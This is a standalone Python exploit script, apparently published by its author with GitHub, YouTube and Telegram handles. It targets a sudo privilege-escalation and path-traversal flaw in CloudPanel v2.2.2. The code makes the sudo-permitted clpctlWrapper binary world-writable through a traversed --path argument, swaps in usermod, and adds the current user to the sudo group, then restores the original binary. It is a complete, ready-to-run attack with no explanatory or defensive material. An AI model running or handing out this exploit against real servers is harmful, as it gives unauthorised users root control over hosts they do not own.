# Exploit Author : EagleEye
# Github : https://github.com/EagleTube/
# Youtube : https://www.youtube.com/@EagleTube1337
# Title : Sudo Privilege Escalation on clpctlWrapper + path traversal
# Version Tested : CloudPanel v2.2.2
# Telegram : @NOP_0x90

import os
import subprocess

def exec_command(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()

def current_user():
    process = subprocess.Popen('whoami', stdout=subprocess.PIPE)
    return process.stdout.read().decode('utf-8')

def exploit():
    print('[-] AUTHOR : EAGLE EYE [-]')
    print('[+] Overriding file to writable')
    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../usr/bin/clpctlWrapper')
    print('[+] Backup clpctlWrapper into tmp...')
    exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')
    print('[+] Replacing clpctlWrapper with usermod...')
    exec_command('cp /usr/sbin/usermod /usr/bin/clpctlWrapper')
    print('[+] Gaining sudo privilege...')
    exec_command('sudo /usr/bin/clpctlWrapper -aG sudo '+current_user())
    print('[+] Moving original file')
    exec_command('cp /tmp/clpctlWrapper /usr/bin/clpctlWrapper')
    print('[!] Please relogin [!]')
    os.system('exit')

if __name__ == '__main__':
    exploit()
